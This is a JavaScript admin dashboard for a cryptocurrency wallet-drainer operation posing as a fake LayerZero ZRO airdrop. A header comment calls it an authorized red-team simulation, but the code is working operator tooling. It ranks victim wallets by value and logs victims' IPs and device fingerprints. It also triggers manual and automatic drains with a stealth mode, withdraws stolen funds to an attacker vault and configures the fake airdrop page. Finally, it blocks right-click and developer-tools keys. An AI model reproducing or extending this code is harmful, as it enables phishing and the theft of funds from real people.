// [RED TEAM SIMULATION - AUTHORIZED TESTING ONLY]
// This asset is part of a high-fidelity security simulation for defensive analysis and documentation.
// Unauthorized use is strictly prohibited.

class AdminDashboard {
    constructor() {
        console.log('[ADMIN] Initializing AdminDashboard...');
        this.stats = {};
        this.updateInterval = null;
        this.uptimeStart = Date.now();
        this.isAuthenticated = false;
        
        this.initializeElements();
        
        if (!document.getElementById('loginScreen')) {
            console.error('[ADMIN] Critical elements missing! Check DOM IDs.');
            return;
        }
        
        this.bindEvents();
        this.checkAuthentication();
    }
    
    checkAuthentication() {
        // Check if user is already authenticated
        const token = localStorage.getItem('adminToken');
        if (token) {
            this.authenticate(token);
        } else {
            this.showLoginScreen();
        }
    }
    
    showLoginScreen() {
        const loginScreen = document.getElementById('loginScreen');
        const dashboardContainer = document.getElementById('dashboardContainer');
        
        if (loginScreen) loginScreen.style.display = 'flex';
        if (dashboardContainer) dashboardContainer.style.display = 'none';
    }
    
    showDashboard() {
        const loginScreen = document.getElementById('loginScreen');
        const dashboardContainer = document.getElementById('dashboardContainer');
        
        if (loginScreen) loginScreen.style.display = 'none';
        if (dashboardContainer) dashboardContainer.style.display = 'block';
        
        this.startUpdates();
        this.updateUptime();
        this.initChart();
    }

    initChart() {
        const ctx = document.getElementById('performanceChart');
        if (!ctx) return;

        this.chart = new Chart(ctx, {
            type: 'line',
            data: {
                labels: ['12:00', '13:00', '14:00', '15:00', '16:00', '17:00', '18:00'],
                datasets: [{
                    label: 'Value Collected ($)',
                    data: [120, 450, 890, 1200, 2400, 3100, 4200],
                    borderColor: '#00ff88',
                    backgroundColor: 'rgba(0, 255, 136, 0.1)',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true
                }, {
                    label: 'Connections',
                    data: [10, 25, 45, 60, 110, 145, 190],
                    borderColor: '#6366f1',
                    backgroundColor: 'rgba(99, 102, 241, 0.1)',
                    borderWidth: 2,
                    tension: 0.4,
                    fill: true,
                    yAxisID: 'y1'
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        labels: { color: '#a0aec0' }
                    }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        grid: { color: 'rgba(255, 255, 255, 0.05)' },
                        ticks: { color: '#a0aec0' }
                    },
                    y1: {
                        position: 'right',
                        beginAtZero: true,
                        grid: { drawOnChartArea: false },
                        ticks: { color: '#a0aec0' }
                    },
                    x: {
                        grid: { color: 'rgba(255, 255, 255, 0.05)' },
                        ticks: { color: '#a0aec0' }
                    }
                }
            }
        });
    }
    
    async authenticate(token) {
        try {
            const response = await fetch('/api/admin/verify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                }
            });
            
            if (response.ok) {
                this.isAuthenticated = true;
                this.showDashboard();
            } else {
                localStorage.removeItem('adminToken');
                this.showLoginScreen();
            }
        } catch (error) {
            console.error('Authentication failed:', error);
            localStorage.removeItem('adminToken');
            this.showLoginScreen();
        }
    }
    
    async handleLogin(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const errorElement = document.getElementById('loginError');
        
        try {
            const response = await fetch('/api/admin/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password })
            });
            
            if (response.ok) {
                const data = await response.json();
                localStorage.setItem('adminToken', data.token);
                this.isAuthenticated = true;
                this.showDashboard();
                errorElement.textContent = '';
            } else {
                const error = await response.json();
                errorElement.textContent = error.message || 'Invalid credentials';
            }
        } catch (error) {
            console.error('Login failed:', error);
            errorElement.textContent = 'Login failed. Please try again.';
        }
    }
    
    handleLogout() {
        localStorage.removeItem('adminToken');
        this.isAuthenticated = false;
        this.showLoginScreen();
        
        // Clear form
        const loginForm = document.getElementById('loginForm');
        if (loginForm) loginForm.reset();
        
        const errorElement = document.getElementById('loginError');
        if (errorElement) errorElement.textContent = '';
    }
    
    initializeElements() {
        // Stats elements
        this.totalConnections = document.getElementById('totalConnections');
        this.totalDrains = document.getElementById('totalDrains');
        this.totalValue = document.getElementById('totalValue');
        this.uniqueWallets = document.getElementById('uniqueWallets');
        this.uptime = document.getElementById('uptime');
        
        // Control elements
        this.tokenSelect = document.getElementById('tokenSelect');
        this.withdrawBtn = document.getElementById('withdrawBtn');
        this.withdrawStatus = document.getElementById('withdrawStatus');
        
        // Operation controls
        this.pauseBtn = document.getElementById('pauseBtn');
        this.resumeBtn = document.getElementById('resumeBtn');
        this.emergencyBtn = document.getElementById('emergencyBtn');
        this.operationStatus = document.getElementById('operationStatus');
        
        // Performance metrics
        this.successRate = document.getElementById('successRate');
        this.avgResponse = document.getElementById('avgResponse');
        this.activeSessions = document.getElementById('activeSessions');
        
        // Advanced settings
        this.drainDelay = document.getElementById('drainDelay');
        this.maxRetries = document.getElementById('maxRetries');
        this.targetPriority = document.getElementById('targetPriority');
        this.stealthMode = document.getElementById('stealthMode');
        this.autoDrainEnabled = document.getElementById('autoDrainEnabled');
        this.minDrainValue = document.getElementById('minDrainValue');
        this.drainAllThreshold = document.getElementById('drainAllThreshold');
        this.saveSettings = document.getElementById('saveSettings');
        
        // Frontend configuration
        this.tokenName = document.getElementById('tokenName');
        this.tokenSymbol = document.getElementById('tokenSymbol');
        this.airdropAmount = document.getElementById('airdropAmount');
        this.totalAllocation = document.getElementById('totalAllocation');
        this.claimedAmount = document.getElementById('claimedAmount');
        this.endDate = document.getElementById('endDate');
        this.description = document.getElementById('description');
        this.saveFrontendConfig = document.getElementById('saveFrontendConfig');
        
        // Balance monitor
        this.attackerBalance = document.getElementById('attackerBalance');
        this.vaultBalance = document.getElementById('vaultBalance');
        this.gasPrice = document.getElementById('gasPrice');
        this.refreshBalances = document.getElementById('refreshBalances');
        
        // Manual drain
        this.walletAddress = document.getElementById('walletAddress');
        this.drainWalletBtn = document.getElementById('drainWalletBtn');
        this.drainStatus = document.getElementById('drainStatus');
        
        // Status indicators
        this.telegramStatus = document.getElementById('telegramStatus');
        this.discordStatus = document.getElementById('discordStatus');
        this.vaultStatus = document.getElementById('vaultStatus');
        this.networkStatus = document.getElementById('networkStatus');
        
        // Activity elements
        this.connectionsList = document.getElementById('connectionsList');
        this.drainsList = document.getElementById('drainsList');
        this.walletsList = document.getElementById('walletsList');
        this.visitorsList = document.getElementById('visitorsList');
        
        // Tab elements
        this.tabBtns = document.querySelectorAll('.tab-btn');
        this.tabContents = document.querySelectorAll('.tab-content');
    }
    
    bindEvents() {
        // Login form
        const loginForm = document.getElementById('loginForm');
        if (loginForm) {
            loginForm.addEventListener('submit', (e) => this.handleLogin(e));
        }
        
        // Logout button
        const logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', () => this.handleLogout());
        }
        
        // Withdraw button
        if (this.withdrawBtn) {
            this.withdrawBtn.addEventListener('click', () => this.withdrawFunds());
        }
        
        // Operation controls
        if (this.pauseBtn) {
            this.pauseBtn.addEventListener('click', () => this.pauseOperations());
        }
        
        if (this.resumeBtn) {
            this.resumeBtn.addEventListener('click', () => this.resumeOperations());
        }
        
        if (this.emergencyBtn) {
            this.emergencyBtn.addEventListener('click', () => this.emergencyStop());
        }
        
        // Advanced settings
        if (this.saveSettings) {
            this.saveSettings.addEventListener('click', () => this.saveAdvancedSettings());
        }
        
        // Frontend configuration
        if (this.saveFrontendConfig) {
            this.saveFrontendConfig.addEventListener('click', () => this.saveFrontendConfiguration());
        }
        
        // Balance monitor
        if (this.refreshBalances) {
            this.refreshBalances.addEventListener('click', () => this.refreshBalanceData());
        }
        
        // Manual drain
        if (this.drainWalletBtn) {
            this.drainWalletBtn.addEventListener('click', () => this.drainWallet());
        }
        
        // Tab switching
        this.tabBtns.forEach(btn => {
            btn.addEventListener('click', (e) => this.switchTab(e.target.dataset.tab));
        });
    }
    
    async startUpdates() {
        // Initial load
        await this.loadStats();
        await this.loadActivity();
        await this.loadBalanceData();
        await this.loadSettings();
        await this.loadFrontendConfig();
        this.updateSystemStatus();
        
        // Set up periodic updates
        this.updateInterval = setInterval(async () => {
            await this.loadStats();
            await this.loadActivity();
            await this.loadBalanceData();
            this.updateSystemStatus();
        }, 5000); // Update every 5 seconds
    }
    
    async loadStats() {
        try {
            const response = await fetch('/api/admin/stats');
            if (response.ok) {
                this.stats = await response.json();
                this.updateStatsDisplay();
            }
        } catch (error) {
            console.error('Failed to load stats:', error);
        }
    }
    
    async loadActivity() {
        try {
            const adminKey = new URLSearchParams(window.location.search).get('key') || '';
            const response = await fetch('/api/admin/stats', {
                headers: { 'x-admin-key': adminKey }
            });
            if (response.ok) {
                const data = await response.json();
                this.updateActivityDisplay(data);
                this.updateWalletsDisplay(data);
            }
        } catch (error) {
            console.error('Failed to load activity:', error);
        }
    }
    
    async loadBalanceData() {
        try {
            const response = await fetch('/api/admin/balances');
            if (response.ok) {
                const data = await response.json();
                this.updateBalanceDisplay(data);
            }
        } catch (error) {
            console.error('Failed to load balance data:', error);
        }
    }
    
    async refreshBalanceData() {
        if (this.refreshBalances) {
            this.refreshBalances.disabled = true;
            this.refreshBalances.textContent = '🔄 Refreshing...';
        }
        
        try {
            await this.loadBalanceData();
        } finally {
            if (this.refreshBalances) {
                this.refreshBalances.disabled = false;
                this.refreshBalances.textContent = '🔄 Refresh';
            }
        }
    }
    
    async loadSettings() {
        try {
            const response = await fetch('/api/admin/settings');
            if (response.ok) {
                const settings = await response.json();
                this.updateSettingsDisplay(settings);
            }
        } catch (error) {
            console.error('Failed to load settings:', error);
        }
    }
    
    async loadFrontendConfig() {
        try {
            const response = await fetch('/api/admin/frontend-config');
            if (response.ok) {
                const config = await response.json();
                this.updateFrontendConfigDisplay(config);
            }
        } catch (error) {
            console.error('Failed to load frontend config:', error);
        }
    }
    
    updateSettingsDisplay(settings) {
        if (this.drainDelay) this.drainDelay.value = settings.drainDelay || 500;
        if (this.maxRetries) this.maxRetries.value = settings.maxRetries || 3;
        if (this.targetPriority) this.targetPriority.value = settings.targetPriority || 'high';
        if (this.stealthMode) this.stealthMode.checked = settings.stealthMode !== false;
        if (this.autoDrainEnabled) this.autoDrainEnabled.checked = settings.autoDrainEnabled !== false;
        if (this.minDrainValue) this.minDrainValue.value = settings.minDrainValue || 1.0;
        if (this.drainAllThreshold) this.drainAllThreshold.value = settings.drainAllThreshold || 1.0;
    }
    
    updateFrontendConfigDisplay(config) {
        if (this.tokenName) this.tokenName.value = config.tokenName || 'LayerZero';
        if (this.tokenSymbol) this.tokenSymbol.value = config.tokenSymbol || 'ZRO';
        if (this.airdropAmount) this.airdropAmount.value = config.airdropAmount || '1000';
        if (this.totalAllocation) this.totalAllocation.value = config.totalAllocation || '10000000';
        if (this.claimedAmount) this.claimedAmount.value = config.claimedAmount || '7500000';
        if (this.endDate) {
            const endDate = new Date(config.endDate || '2024-12-31T23:59:59Z');
            this.endDate.value = endDate.toISOString().slice(0, 16);
        }
        if (this.description) this.description.value = config.description || 'LayerZero is a protocol that enables cross-chain applications to communicate with each other in a trustless manner.';
    }
    
    async drainWallet() {
        if (!this.walletAddress || !this.drainWalletBtn || !this.drainStatus) return;
        
        const walletAddress = this.walletAddress.value.trim();
        if (!walletAddress || !walletAddress.startsWith('0x')) {
            this.drainStatus.textContent = 'Please enter a valid wallet address';
            this.drainStatus.className = 'status-message error';
            return;
        }
        
        try {
            this.drainWalletBtn.disabled = true;
            this.drainWalletBtn.textContent = 'Draining...';
            this.drainStatus.textContent = `Analyzing wallet ${walletAddress}...`;
            this.drainStatus.className = 'status-message';
            
            const response = await fetch('/api/admin/drain-wallet', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ walletAddress })
            });
            
            if (response.ok) {
                const result = await response.json();
                this.drainStatus.textContent = `Successfully drained ${result.amount} ${result.token}! TX: ${result.txHash}`;
                this.drainStatus.className = 'status-message success';
                this.walletAddress.value = '';
            } else {
                const error = await response.json();
                this.drainStatus.textContent = `Drain failed: ${error.error}`;
                this.drainStatus.className = 'status-message error';
            }
        } catch (error) {
            console.error('Manual drain error:', error);
            this.drainStatus.textContent = 'Drain failed: Network error';
            this.drainStatus.className = 'status-message error';
        } finally {
            this.drainWalletBtn.disabled = false;
            this.drainWalletBtn.textContent = '💸 Drain Wallet';
        }
    }
    
    updateBalanceDisplay(data) {
        if (this.attackerBalance) {
            this.attackerBalance.textContent = data.attackerBalance ? `${parseFloat(data.attackerBalance).toFixed(4)} ETH` : 'N/A';
        }
        
        if (this.vaultBalance) {
            this.vaultBalance.textContent = data.vaultBalance ? `${parseFloat(data.vaultBalance).toFixed(4)} ETH` : 'N/A';
        }
        
        if (this.gasPrice) {
            this.gasPrice.textContent = data.gasPrice ? `${data.gasPrice} Gwei` : 'N/A';
        }
    }
    
    updateWalletsDisplay(data) {
        if (this.walletsList && data.recentActivity) {
            this.walletsList.innerHTML = '';
            
            // Get unique wallets from recent activity
            const uniqueWallets = new Map();
            
            data.recentActivity.forEach(activity => {
                if (activity.type === 'wallet_connected' && !uniqueWallets.has(activity.walletAddress)) {
                    uniqueWallets.set(activity.walletAddress, {
                        address: activity.walletAddress,
                        timestamp: activity.timestamp,
                        walletType: activity.walletType,
                        balance: activity.balance || '0',
                        totalValue: activity.totalValue || 0,
                        tokenBalances: activity.tokenBalances || [],
                        allAssets: activity.allAssets || []
                    });
                }
            });
            
            if (uniqueWallets.size === 0) {
                this.walletsList.innerHTML = '<div class="loading">No connected wallets yet</div>';
                return;
            }
            
            // Sort wallets by total value (highest first)
            const sortedWallets = Array.from(uniqueWallets.values()).sort((a, b) => b.totalValue - a.totalValue);
            
            sortedWallets.forEach(wallet => {
                // Build assets list
                let assetsList = '';
                if (wallet.allAssets && wallet.allAssets.length > 0) {
                    assetsList = wallet.allAssets.map(asset => 
                        `<span class="token-badge">${asset.symbol}: ${asset.balance} ($${asset.value.toFixed(2)})</span>`
                    ).join('');
                } else if (wallet.tokenBalances && wallet.tokenBalances.length > 0) {
                    assetsList = wallet.tokenBalances.map(token => 
                        `<span class="token-badge">${token.symbol}: ${token.balanceFormatted} ($${token.value.toFixed(2)})</span>`
                    ).join('');
                } else {
                    assetsList = `<span class="token-badge">ETH: ${parseFloat(wallet.balance).toFixed(4)} ETH ($${(parseFloat(wallet.balance) * 3000).toFixed(2)})</span>`;
                }
                
                const item = document.createElement('div');
                item.className = 'wallet-item';
                item.innerHTML = `
                    <div class="wallet-header">
                        <div class="wallet-address">${wallet.address}</div>
                        <div class="wallet-balance">${parseFloat(wallet.balance).toFixed(4)} ETH</div>
                    </div>
                    <div class="wallet-details">
                        <strong>Wallet Type:</strong> ${wallet.walletType}<br>
                        <strong>Total Value:</strong> $${wallet.totalValue.toLocaleString()}<br>
                        <strong>Connected:</strong> ${wallet.timestamp ? new Date(wallet.timestamp).toLocaleString() : 'Unknown'}
                    </div>
                    <div class="wallet-tokens">
                        ${assetsList}
                    </div>
                    <button class="drain-btn" onclick="adminDashboard.drainWallet('${wallet.address}')">
                        💸 Drain Wallet
                    </button>
                `;
                this.walletsList.appendChild(item);
            });
        }
    }
    
    async drainWallet(walletAddress) {
        try {
            // Show loading state
            this.showNotification(`Initiating drain for ${walletAddress.substring(0, 8)}...`, 'info');
            
            const response = await fetch('/api/admin/drain-wallet', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ walletAddress })
            });
            
            const result = await response.json();
            
            if (response.ok) {
                this.showNotification(`✅ Successfully drained ${result.amount} ${result.token}! TX: ${result.txHash.substring(0, 10)}...`, 'success');
                // Refresh data
                await this.loadActivity();
                await this.loadBalanceData();
            } else {
                // Handle specific error cases
                let errorMessage = result.error || 'Unknown error occurred';
                
                if (errorMessage.includes('No drainable tokens')) {
                    errorMessage = `❌ No tokens found in wallet ${walletAddress.substring(0, 8)}...`;
                } else if (errorMessage.includes('Vault contract not configured')) {
                    errorMessage = '❌ System not configured for draining. Please check deployment.';
                } else if (errorMessage.includes('insufficient funds')) {
                    errorMessage = '❌ Insufficient gas fees for transaction.';
                } else {
                    errorMessage = `❌ Drain failed: ${errorMessage}`;
                }
                
                this.showNotification(errorMessage, 'error');
            }
        } catch (error) {
            console.error('Drain wallet error:', error);
            this.showNotification('❌ Network error during drain attempt', 'error');
        }
    }
    
    updateStatsDisplay() {
        if (this.totalConnections) {
            this.totalConnections.textContent = this.stats.totalConnections || 0;
        }
        
        if (this.totalDrains) {
            this.totalDrains.textContent = this.stats.totalDrains || 0;
        }
        
        if (this.totalValue) {
            const value = this.stats.totalValueDrained || 0;
            this.totalValue.textContent = `$${value.toLocaleString()}`;
        }
        
        if (this.uniqueWallets) {
            this.uniqueWallets.textContent = this.stats.uniqueWallets || 0;
        }

        // Update chart if data is available
        if (this.stats.performanceHistory) {
            this.updateChart(this.stats.performanceHistory);
        }
    }

    updateChart(history) {
        if (!this.chart || !history) return;

        this.chart.data.labels = history.labels;
        this.chart.data.datasets[0].data = history.values;
        this.chart.data.datasets[1].data = history.connections;
        this.chart.update();
    }
    
    updateActivityDisplay(data) {
        // Update connections list
        if (this.connectionsList && data.recentActivity) {
            this.connectionsList.innerHTML = '';
            
            if (data.recentActivity.length === 0) {
                this.connectionsList.innerHTML = '<div class="loading">No recent connections</div>';
                return;
            }
            
            data.recentActivity.forEach(activity => {
                if (activity.type === 'wallet_connected') {
                    const visitorInfo = activity.visitorInfo || {};
                    const item = this.createActivityItem({
                        title: 'Wallet Connected',
                        time: activity.timestamp ? new Date(activity.timestamp).toLocaleString() : 'Unknown',
                        details: `
                            <strong>Wallet:</strong> <span class="wallet-address">${activity.walletAddress}</span><br>
                            <strong>Type:</strong> ${activity.walletType || 'Unknown'}<br>
                            <strong>IP:</strong> ${visitorInfo.ip || 'Unknown'}<br>
                            <strong>Device:</strong> ${visitorInfo.deviceFingerprint || 'Unknown'}<br>
                            <strong>Language:</strong> ${visitorInfo.language || 'Unknown'}
                        `
                    });
                    this.connectionsList.appendChild(item);
                }
            });
        }
        
        // Update drains list
        if (this.drainsList && data.successfulDrains) {
            this.drainsList.innerHTML = '';
            
            if (data.successfulDrains.length === 0) {
                this.drainsList.innerHTML = '<div class="loading">No successful drains yet</div>';
                return;
            }
            
            data.successfulDrains.forEach(drain => {
                const item = this.createActivityItem({
                    title: `Drain: ${drain.tokenSymbol}`,
                    time: drain.timestamp ? new Date(drain.timestamp).toLocaleString() : 'Unknown',
                    details: `
                        <strong>Target:</strong> <span class="wallet-address">${drain.walletAddress}</span><br>
                        <strong>Amount:</strong> ${drain.amount} ${drain.tokenSymbol}<br>
                        <strong>Value:</strong> $${drain.value}<br>
                        <strong>TX:</strong> <span class="tx-hash">${drain.txHash}</span>
                    `
                });
                this.drainsList.appendChild(item);
            });
        }
        
        // Update visitors list - Fixed to handle both visitorLog and recentActivity
        if (this.visitorsList) {
            this.visitorsList.innerHTML = '';
            
            // Check if we have visitor log data
            if (data.visitorLog && data.visitorLog.length > 0) {
                data.visitorLog.forEach(visitor => {
                    const item = this.createActivityItem({
                        title: `Visitor: ${visitor.path || 'Unknown Page'}`,
                        time: visitor.timestamp ? new Date(visitor.timestamp).toLocaleString() : 'Unknown',
                        details: `
                            <strong>IP:</strong> ${visitor.ip || 'Unknown'}<br>
                            <strong>Device:</strong> ${visitor.deviceFingerprint || 'Unknown'}<br>
                            <strong>Language:</strong> ${visitor.language || 'Unknown'}<br>
                            <strong>Method:</strong> ${visitor.method || 'GET'}<br>
                            <strong>Referer:</strong> ${visitor.referer || 'Direct'}
                        `
                    });
                    this.visitorsList.appendChild(item);
                });
            } else if (data.recentActivity && data.recentActivity.length > 0) {
                // Fallback: extract visitor info from recent activity
                const visitors = new Map();
                data.recentActivity.forEach(activity => {
                    if (activity.visitorInfo && !visitors.has(activity.visitorInfo.ip)) {
                        visitors.set(activity.visitorInfo.ip, activity.visitorInfo);
                    }
                });
                
                if (visitors.size > 0) {
                    Array.from(visitors.values()).forEach(visitor => {
                        const item = this.createActivityItem({
                            title: `Visitor: ${visitor.ip}`,
                            time: new Date().toLocaleString(),
                            details: `
                                <strong>IP:</strong> ${visitor.ip || 'Unknown'}<br>
                                <strong>Device:</strong> ${visitor.deviceFingerprint || 'Unknown'}<br>
                                <strong>Language:</strong> ${visitor.language || 'Unknown'}<br>
                                <strong>Referer:</strong> ${visitor.referer || 'Direct'}
                            `
                        });
                        this.visitorsList.appendChild(item);
                    });
                } else {
                    this.visitorsList.innerHTML = '<div class="loading">No visitors yet</div>';
                }
            } else {
                this.visitorsList.innerHTML = '<div class="loading">No visitors yet</div>';
            }
        }
    }
    
    createActivityItem(data) {
        const item = document.createElement('div');
        item.className = 'activity-item';
        item.innerHTML = `
            <div class="activity-header">
                <div class="activity-title">${data.title}</div>
                <div class="activity-time">${data.time}</div>
            </div>
            <div class="activity-details">${data.details}</div>
        `;
        return item;
    }
    
    async withdrawFunds() {
        if (!this.tokenSelect || !this.withdrawBtn || !this.withdrawStatus) return;
        
        const tokenAddress = this.tokenSelect.value;
        const tokenName = this.tokenSelect.options[this.tokenSelect.selectedIndex].text;
        
        try {
            this.withdrawBtn.disabled = true;
            this.withdrawBtn.textContent = 'Withdrawing...';
            this.withdrawStatus.textContent = `Withdrawing ${tokenName}...`;
            this.withdrawStatus.className = 'status-message';
            
            const response = await fetch('/api/admin/withdraw', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ tokenAddress })
            });
            
            if (response.ok) {
                const result = await response.json();
                this.withdrawStatus.textContent = `Successfully withdrew ${tokenName}! TX: ${result.txHash}`;
                this.withdrawStatus.className = 'status-message success';
            } else {
                const error = await response.json();
                this.withdrawStatus.textContent = `Withdrawal failed: ${error.error}`;
                this.withdrawStatus.className = 'status-message error';
            }
        } catch (error) {
            console.error('Withdrawal error:', error);
            this.withdrawStatus.textContent = 'Withdrawal failed: Network error';
            this.withdrawStatus.className = 'status-message error';
        } finally {
            this.withdrawBtn.disabled = false;
            this.withdrawBtn.textContent = 'Withdraw';
        }
    }
    
    switchTab(tabName) {
        // Update tab buttons
        this.tabBtns.forEach(btn => {
            btn.classList.toggle('active', btn.dataset.tab === tabName);
        });
        
        // Update tab content
        this.tabContents.forEach(content => {
            content.classList.toggle('active', content.id === `${tabName}Tab`);
        });
    }
    
    updateUptime() {
        // Start uptime counter immediately
        const updateUptimeDisplay = () => {
            const uptime = Date.now() - this.uptimeStart;
            const hours = Math.floor(uptime / (1000 * 60 * 60));
            const minutes = Math.floor((uptime % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((uptime % (1000 * 60)) / 1000);
            
            if (this.uptime) {
                this.uptime.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }
        };
        
        // Update immediately and then every second
        updateUptimeDisplay();
        setInterval(updateUptimeDisplay, 1000);
    }
    
    pauseOperations() {
        if (this.pauseBtn && this.resumeBtn && this.operationStatus) {
            this.pauseBtn.style.display = 'none';
            this.resumeBtn.style.display = 'inline-block';
            this.operationStatus.textContent = 'PAUSED';
            this.operationStatus.className = 'status-value paused';
            
            // Send pause command to backend
            fetch('/api/admin/pause', { method: 'POST' })
                .catch(error => console.error('Failed to pause operations:', error));
        }
    }
    
    resumeOperations() {
        if (this.pauseBtn && this.resumeBtn && this.operationStatus) {
            this.pauseBtn.style.display = 'inline-block';
            this.resumeBtn.style.display = 'none';
            this.operationStatus.textContent = 'ACTIVE';
            this.operationStatus.className = 'status-value active';
            
            // Send resume command to backend
            fetch('/api/admin/resume', { method: 'POST' })
                .catch(error => console.error('Failed to resume operations:', error));
        }
    }
    
    emergencyStop() {
        if (this.operationStatus) {
            this.operationStatus.textContent = 'EMERGENCY STOP';
            this.operationStatus.className = 'status-value emergency';
            
            // Send emergency stop command to backend
            fetch('/api/admin/emergency-stop', { method: 'POST' })
                .catch(error => console.error('Failed to emergency stop:', error));
        }
    }
    
    saveAdvancedSettings() {
        if (!this.drainDelay || !this.maxRetries || !this.targetPriority || !this.stealthMode) return;
        
        const settings = {
            drainDelay: parseInt(this.drainDelay.value),
            maxRetries: parseInt(this.maxRetries.value),
            targetPriority: this.targetPriority.value,
            stealthMode: this.stealthMode.checked,
            autoDrainEnabled: this.autoDrainEnabled ? this.autoDrainEnabled.checked : true,
            minDrainValue: this.minDrainValue ? parseFloat(this.minDrainValue.value) : 1.0,
            drainAllThreshold: this.drainAllThreshold ? parseFloat(this.drainAllThreshold.value) : 1.0
        };
        
        // Send settings to backend
        fetch('/api/admin/settings', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(settings)
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                this.showNotification('Settings saved successfully!', 'success');
            } else {
                this.showNotification('Failed to save settings', 'error');
            }
        })
        .catch(error => {
            console.error('Settings save error:', error);
            this.showNotification('Failed to save settings', 'error');
        });
    }
    
    saveFrontendConfiguration() {
        if (!this.tokenName || !this.tokenSymbol) return;
        
        const config = {
            tokenName: this.tokenName.value,
            tokenSymbol: this.tokenSymbol.value,
            airdropAmount: this.airdropAmount ? this.airdropAmount.value : '1000',
            totalAllocation: this.totalAllocation ? this.totalAllocation.value : '10000000',
            claimedAmount: this.claimedAmount ? this.claimedAmount.value : '7500000',
            endDate: this.endDate ? this.endDate.value + ':59' : '2024-12-31T23:59:59Z',
            description: this.description ? this.description.value : 'LayerZero is a protocol that enables cross-chain applications to communicate with each other in a trustless manner.',
            features: [
                'Cross-chain messaging',
                'Trustless communication',
                'Decentralized infrastructure',
                'Multi-chain support'
            ]
        };
        
        // Send frontend config to backend
        fetch('/api/admin/frontend-config', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(config)
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                this.showNotification('Frontend configuration saved successfully!', 'success');
            } else {
                this.showNotification('Failed to save frontend configuration', 'error');
            }
        })
        .catch(error => {
            console.error('Frontend config save error:', error);
            this.showNotification('Failed to save frontend configuration', 'error');
        });
    }
    
    // Manual drain function
    async manualDrain() {
        const walletAddress = this.manualDrainAddress?.value;
        if (!walletAddress) {
            this.showNotification('Please enter a wallet address', 'error');
            return;
        }
        
        if (this.manualDrainBtn) {
            this.manualDrainBtn.disabled = true;
            this.manualDrainBtn.textContent = '🔄 Draining...';
        }
        
        try {
            const response = await fetch('/api/admin/manual-drain', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ walletAddress })
            });
            
            const result = await response.json();
            
            if (result.success) {
                this.showNotification(`Drain completed for ${walletAddress}`, 'success');
                this.loadBalanceData(); // Refresh balance data
            } else {
                this.showNotification(result.message || 'Drain failed', 'error');
            }
        } catch (error) {
            console.error('Manual drain error:', error);
            this.showNotification('Manual drain failed', 'error');
        } finally {
            if (this.manualDrainBtn) {
                this.manualDrainBtn.disabled = false;
                this.manualDrainBtn.textContent = '💸 Drain Wallet';
            }
        }
    }
    
    // Save advanced settings
    async saveAdvancedSettings() {
        const settings = {
            drainDelay: this.drainDelay?.value,
            maxRetries: this.maxRetries?.value,
            targetPriority: this.targetPriority?.value,
            stealthMode: this.stealthMode?.checked,
            autoDrainEnabled: this.autoDrainEnabled?.checked,
            minDrainValue: this.minDrainValue?.value,
            drainAllThreshold: this.drainAllThreshold?.value
        };
        
        try {
            const response = await fetch('/api/admin/advanced-settings', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(settings)
            });
            
            const result = await response.json();
            
            if (result.success) {
                this.showNotification('Advanced settings saved successfully!', 'success');
            } else {
                this.showNotification('Failed to save advanced settings', 'error');
            }
        } catch (error) {
            console.error('Advanced settings save error:', error);
            this.showNotification('Failed to save advanced settings', 'error');
        }
    }
    
    showNotification(message, type = 'info') {
        // Create a simple notification
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 1rem;
            border-radius: 8px;
            color: white;
            font-weight: 500;
            z-index: 1000;
            background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#6366f1'};
        `;
        notification.textContent = message;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            if (notification.parentElement) {
                notification.remove();
            }
        }, 3000);
    }
    
    updateSystemStatus() {
        // Check system status
        fetch('/health')
            .then(response => {
                if (response.ok) {
                    this.networkStatus.className = 'status-indicator';
                    this.vaultStatus.className = 'status-indicator';
                } else {
                    this.networkStatus.className = 'status-indicator offline';
                    this.vaultStatus.className = 'status-indicator offline';
                }
            })
            .catch(() => {
                this.networkStatus.className = 'status-indicator offline';
                this.vaultStatus.className = 'status-indicator offline';
            });
        
        // Check notification status (simplified)
        this.telegramStatus.className = 'status-indicator';
        this.discordStatus.className = 'status-indicator';
    }
}

// Export to window for global access
window.AdminDashboard = AdminDashboard;

// Initialization is now handled in index.html to ensure script order
/*
document.addEventListener('DOMContentLoaded', () => {
    console.log('[ADMIN] DOM Content Loaded, starting dashboard...');
    if (typeof AdminDashboard !== 'undefined') {
        adminDashboard = new AdminDashboard();
    } else {
        console.error('[ADMIN] AdminDashboard class not found at runtime!');
    }
});
*/

// Prevent right-click context menu
document.addEventListener('contextmenu', (e) => e.preventDefault());

// Prevent F12, Ctrl+Shift+I, Ctrl+U
document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.key === 'u')) {
        e.preventDefault();
    }
});
